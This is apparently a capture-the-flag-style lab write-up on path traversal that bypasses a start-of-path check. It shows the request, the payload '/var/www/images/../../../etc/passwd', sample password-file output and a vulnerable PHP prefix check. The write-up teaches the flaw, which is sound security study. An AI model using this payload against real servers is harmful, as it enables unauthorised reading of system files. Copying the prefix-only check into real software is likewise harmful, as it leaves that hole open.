# File Path Traversal with Validation of Start of Path

## Lab Information

| Field | Value |
|-------|-------|
| **Lab** | File path traversal with validation of start of path |
| **Category** | Path Traversal / Directory Traversal |
| **Severity** | High |
| **CWE** | CWE-22 – Improper Limitation of a Pathname to a Restricted Directory |
| **OWASP Top 10** | A01:2021 – Broken Access Control |

---

# Executive Summary

The application was vulnerable to a **Path Traversal** vulnerability due to improper validation of user-supplied file paths. Instead of validating the final canonical path, the application only verified that the supplied filename began with the trusted directory `/var/www/images/`.

By supplying a legitimate base directory followed by directory traversal sequences (`../`), it was possible to escape the intended directory and access arbitrary files on the server.

The vulnerability was successfully exploited to disclose the contents of the Linux `/etc/passwd` file.

---

# Objective

Retrieve the contents of:

```text
/etc/passwd
```

---

# Vulnerability Discovery

While browsing a product page, the application requested the product image using the following endpoint:

```http
GET /image?filename=/var/www/images/6.jpg HTTP/2
Host: LAB-ID.web-security-academy.net
```

Unlike previous Path Traversal labs, the application already supplied an **absolute filesystem path** instead of just a filename.

This indicates that the backend directly consumes filesystem paths provided by the client.

---

# Exploitation

The application appeared to validate only that the supplied path started with:

```text
/var/www/images/
```

The following payload preserves the expected prefix while escaping the directory afterwards:

```text
/var/www/images/../../../etc/passwd
```

Modified request:

```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: LAB-ID.web-security-academy.net
```

---

# Result

The server successfully returned the contents of the Linux password file.

Example:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/usr/sbin:/usr/sbin/nologin
...
```

The lab was automatically marked as solved after the file was successfully retrieved.

---

# Technical Analysis

The vulnerability exists because the application validates only the **beginning of the supplied path**, rather than the canonical path after normalization.

A simplified implementation may resemble:

```php
if (strpos($filename, "/var/www/images/") === 0) {
    readfile($filename);
}
```

The supplied payload begins with the trusted directory:

```text
/var/www/images/
```

Therefore, the validation succeeds.

Before opening the file, the operating system resolves the traversal sequences:

```text
/var/www/images/../../../etc/passwd
```

into:

```text
/etc/passwd
```

This occurs because each `../` moves one directory upwards.

